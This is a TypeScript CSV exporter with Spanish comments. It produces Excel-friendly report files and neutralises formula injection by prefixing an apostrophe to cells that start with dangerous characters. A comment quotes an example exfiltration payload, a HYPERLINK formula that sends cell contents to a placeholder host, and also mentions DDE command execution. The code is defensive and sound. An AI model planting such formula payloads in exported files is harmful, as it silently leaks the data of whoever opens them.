import type {
  ColumnaReporte,
  FormatoExportacion,
  ReporteDTO,
  ValorCelda,
} from '../../../compartido/tipos.js';
import { Exportador } from './Exportador.js';

/**
 * Punto y coma, no coma.
 *
 * Excel elige el separador de listas según la configuración regional, y en
 * es-AR / es-ES ese separador es ';'. Con ',' el archivo se abre con todo
 * amontonado en la columna A. Además nuestros números usan la coma como
 * separador decimal, con lo que un CSV separado por comas obligaría a
 * entrecomillar prácticamente cada importe.
 */
const SEPARADOR = ';';

/** RFC 4180 exige CRLF, y es lo único que Excel interpreta sin dudar. */
const FIN_LINEA = '\r\n';

/**
 * Marca de orden de bytes UTF-8. Sin ella Excel asume la página de códigos
 * local (Windows-1252) y destroza cualquier carácter no ASCII del reporte.
 */
const BOM = Uint8Array.of(0xef, 0xbb, 0xbf);

/** Etiqueta de la fila final de totales. */
const ETIQUETA_TOTALES = 'TOTALES';

/** Caracteres con los que una hoja de cálculo empieza a leer una fórmula. */
const INICIOS_PELIGROSOS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Prevención de inyección de fórmulas (CSV injection).
 *
 * Excel, LibreOffice y Sheets evaluan como fórmula toda celda que empiece por
 * '=', '+', '-', '@', TAB o CR. Un empleado que escriba
 * `=HYPERLINK("http://malo/"&A1,"ok")` en la descripción de una tarea consigue
 * que se ejecute en la máquina de quien abra el reporte: exfiltración de datos
 * en silencio y, vía DDE, ejecución de comandos. El apóstrofo inicial obliga a
 * la hoja de cálculo a tratar la celda como texto literal.
 */
function neutralizarFormula(texto: string): string {
  const primero = texto.slice(0, 1);
  return INICIOS_PELIGROSOS.includes(primero) ? `'${texto}` : texto;
}

/**
 * Escapado RFC 4180: solo hace falta entrecomillar si el campo lleva el
 * separador, comillas o un salto de línea; las comillas internas se duplican.
 */
function escaparCampo(campo: string): string {
  const necesitaComillas =
    campo.includes(SEPARADOR) ||
    campo.includes('"') ||
    campo.includes('\n') ||
    campo.includes('\r');
  return necesitaComillas ? `"${campo.replace(/"/g, '""')}"` : campo;
}

/**
 * Exportación a CSV pensada para abrirse en Excel sin retoques: BOM UTF-8,
 * separador ';', fin de línea CRLF y escapado RFC 4180.
 */
export class ExportadorCSV extends Exportador {
  override get formato(): FormatoExportacion {
    return 'csv';
  }

  override get tipoMime(): string {
    return 'text/csv; charset=utf-8';
  }

  override get extension(): string {
    return 'csv';
  }

  override async exportar(reporte: ReporteDTO): Promise<Uint8Array> {
    const lineas: string[] = [];

    const cabecera = reporte.columnas.map((columna) =>
      escaparCampo(neutralizarFormula(columna.titulo)),
    );
    lineas.push(cabecera.join(SEPARADOR));

    for (const fila of reporte.filas) {
      lineas.push(
        reporte.columnas
          // Indexar un Record devuelve `undefined` si la clave falta: una fila
          // incompleta debe salir como celda vacía, no como "undefined".
          .map((columna) => this.celda(fila[columna.clave] ?? null, columna))
          .join(SEPARADOR),
      );
    }

    if (Object.keys(reporte.totales).length > 0) {
      lineas.push(this.filaTotales(reporte));
    }

    const cuerpo = new TextEncoder().encode(lineas.join(FIN_LINEA) + FIN_LINEA);
    const salida = new Uint8Array(BOM.length + cuerpo.length);
    salida.set(BOM, 0);
    salida.set(cuerpo, BOM.length);
    return salida;
  }

  private filaTotales(reporte: ReporteDTO): string {
    return reporte.columnas
      .map((columna, indice) => {
        // La etiqueta pisa la primera columna aunque esa columna tenga total:
        // sin ella la última fila parece un registro más del listado.
        if (indice === 0) return escaparCampo(ETIQUETA_TOTALES);
        return this.celda(reporte.totales[columna.clave] ?? null, columna);
      })
      .join(SEPARADOR);
  }

  private celda(valor: ValorCelda, columna: ColumnaReporte): string {
    const texto = this.formatearCelda(valor, columna);
    // Solo el texto de origen puede traer una fórmula; números, booleanos y
    // fechas los redacta la clase base. Neutralizar también esos rompería todo
    // importe negativo, que ya empieza por '-'.
    return escaparCampo(typeof valor === 'string' ? neutralizarFormula(texto) : texto);
  }
}
